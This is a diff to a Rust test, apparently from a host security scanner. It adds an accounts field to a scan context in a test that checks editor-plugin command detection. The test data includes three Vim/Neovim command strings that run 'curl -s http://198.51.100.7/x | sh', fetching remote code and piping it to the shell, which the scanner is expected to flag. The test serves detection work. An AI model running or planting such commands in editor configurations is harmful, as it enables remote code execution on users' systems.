@@ -260,7 +260,7 @@ fn editors_lazy_plugins_vim_cmd_and_look_alike_folders() {
     let root = dir.path();
     let sys = SysRoot::new(root);
     let cfg = Config::default();
-    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, wallet_watch_secs: 0, privileged: true, processes: &[] };
+    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, wallet_watch_secs: 0, privileged: true, processes: &[], accounts: scanner::procinfo::read_accounts(&sys) };
     for line in ["vim.cmd(\"!curl -s http://198.51.100.7/x | sh\")", "vim.cmd [[silent! !curl -s http://198.51.100.7/x | sh]]", "vim.api.nvim_command('!curl -s http://198.51.100.7/x | sh')"] {
         assert_eq!(editor_commands(&ctx, line, true).len(), 1, "{line}");
     }
